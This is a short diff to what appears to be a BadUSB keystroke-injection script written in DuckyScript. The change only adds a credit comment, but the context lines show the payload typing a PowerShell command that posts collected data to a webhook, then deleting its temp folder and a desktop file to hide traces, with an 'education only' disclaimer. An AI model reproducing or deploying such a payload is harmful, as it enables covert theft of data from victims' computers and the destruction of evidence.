@@ -29,3 +29,4 @@ ENTER
 STRING Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body;Set-Location -Path "$env:temp"; Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt; exit
 ENTER
 REM Not responsible if used for purposes other than education.
+REM inspired by https://github.com/UberGuidoZ
